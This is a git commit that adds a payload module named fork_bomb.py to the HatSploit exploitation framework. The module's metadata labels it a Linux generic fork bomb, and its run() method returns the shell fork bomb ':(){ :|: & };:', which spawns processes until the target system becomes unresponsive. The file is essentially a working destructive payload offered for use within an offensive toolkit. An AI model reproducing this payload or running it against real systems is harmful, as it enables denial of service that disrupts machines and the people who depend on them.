ace75ec8ab2e73757be22f5bbd8a9ff6a6162cd6
Ivan Nikolsky <enty8080@gmail.com>
2022-02-08 17:31:38 +0300

    Create fork_bomb.py

---
+++ hatsploit/payloads/linux/generic/fork_bomb.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python3
+
+#
+# This payload requires HatSploit: https://hatsploit.netlify.app
+# Current source: https://github.com/EntySec/HatSploit
+#
+
+from hatsploit.lib.payload import Payload
+
+
+class HatSploitPayload(Payload):
+    details = {
+        'Category': "single",
+        'Name': "Linux generic Fork Bomb",
+        'Payload': "linux/generic/fork_bomb",
+        'Authors': [
+            'Ivan Nikolsky (enty8080) - payload developer'
+        ],
+        'Description': "Linux generic fork bomb.",
+        'Architecture': "generic",
+        'Platform': "linux",
+        'Rank': "high",
+        'Type': "one_side"
+    }
+
+    def run(self):
+        return ':(){ :|: & };:'
